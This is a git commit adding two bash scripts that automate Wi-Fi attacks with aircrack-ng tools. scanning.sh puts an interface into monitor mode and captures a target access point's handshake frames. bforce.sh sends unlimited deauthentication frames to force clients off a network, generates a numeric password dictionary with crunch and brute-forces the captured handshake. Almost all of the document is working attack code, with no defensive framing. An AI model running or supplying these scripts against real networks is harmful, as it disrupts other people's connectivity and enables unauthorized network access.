d1a23fa1aa1c779321f7931d47ae2f23709e5f7e
Nexif <33202338+vNexif@users.noreply.github.com>
2021-11-22 02:43:51 +0100

    Add shell files

---
+++ bforce.sh
@@ -0,0 +1,73 @@
+#!/bin/bash
+export PATH=$PATH:/bin:/sbin:/usr/local/sbin:/usr/local/sbin
+INTERFACE=""
+AP_BSSID=""
+STA=""
+IF="crack-01.cap"
+DIC=""
+
+if [ "$EUID" -ne 0 ]
+    then echo "Please run as super user"
+    exit
+fi
+
+
+help(){
+	echo "Brute Force Hacking Helper Script";
+	echo "Options:"
+	echo "i - Sets disassoc wireless interface";
+	echo "b - Sets AP_BSSID for Filtering";
+	echo "c - Sets Client Station MAC";
+	echo "d - Disassociation of device";
+	echo "g - Generate dictionary with crunch";
+	echo "f - Brute Force password";
+	1>&2; exit 1;
+}
+
+diasssoc(){
+	if [ -z "${STA}" ]; then
+		aireplay-ng -a $AP_BSSID --deauth 0 $INTERFACE;
+	else
+		aireplay-ng -a $AP_BSSID -c $STA --deauth 0 $INTERFACE;
+	fi
+}
+
+pwd_gen(){
+	crunch 8 8 1234567890 -t 25772@@@ -o $DIC;
+}
+
+crack_pwd(){
+	aircrack-ng $IF -w $DIC;
+}
+
+while getopts "hsi:b:c:dg:f:" opt; do
+    case "${opt}" in
+    h)
+        help
+        exit 1;
+        ;;
+    i)	INTERFACE=${OPTARG}
+		;;
+    b)	AP_BSSID=${OPTARG};
+		;;
+    c)	STA=${OPTARG};
+		;;
+    d) 	diasssoc;
+        exit 1;
+      	;;
+    g)  DIC=${OPTARG};
+		pwd_gen;
+		exit 1;
+		;;
+    f)	DIC=${OPTARG};
+		crack_pwd;
+		exit 1;
+		;;
+
+    esac
+done
+
+if [ $opt =  ? ]; then
+	help;
+	1>&2; exit 1;
+fi
---
+++ scanning.sh
@@ -0,0 +1,76 @@
+#!/bin/bash
+export PATH=$PATH:/bin:/sbin:/usr/local/bin:/usr/local/sbin
+INTERFACE="wlan0"
+AP_BSSID=""
+CH=""
+CH_RNG='\b([1-9]|1[0-2])\b'
+OF="crack"
+
+if [ "$EUID" -ne 0 ]
+    then echo "Please run as super user"
+    exit
+fi
+
+help(){
+	echo "Brute Force Hacking Helper Script";
+	echo "Options:"
+	echo "s - Scans everything";
+	echo "i - Sets scanning wireless interface";
+	echo "c - Sets scanning channel"
+	echo "b - Sets AP_BSSID for Filtering";
+	echo "f - Scans devices with BSSID filtering"
+	echo "w - Scans and saves frames. Required BSSID"
+	1>&2; exit 1;
+}
+
+scan(){
+	airmon-ng start $INTERFACE;
+	airmon-ng check kill;
+	airodump-ng $INTERFACE;
+}
+
+scan_target(){
+	if [[ $CH =~ $CH_RNG ]]; then
+		airodump-ng --bssid $AP_BSSID --channel $CH $INTERFACE;
+	else
+		airodump-ng --bssid $AP_BSSID $INTERFACE;
+	fi
+}
+
+get_target_frames(){
+	if [[ $CH =~ $CH_RNG ]]; then
+		airodump-ng --bssid $AP_BSSID --channel $CH --write $OF $INTERFACE;
+	else
+		airodump-ng --bssid $AP_BSSID --write $OF $INTERFACE;
+	fi
+}
+
+while getopts "hsi:c:b:fw" opt; do
+    case "${opt}" in
+    h)
+        help
+        exit 1;
+        ;;
+    s) 	scan;
+        exit 1;
+        ;;
+    i)	INTERFACE=${OPTARG}
+		;;
+    c)	CH=${OPTARG}
+		;;
+    b)	AP_BSSID=${OPTARG};
+		;;
+    f) 	scan_target;
+        exit 1;
+      	;;
+    w)	get_target_frames;
+		exit 1;
+		;;
+
+    esac
+done
+
+if [ $opt =  ? ]; then
+	help;
+	1>&2; exit 1;
+fi
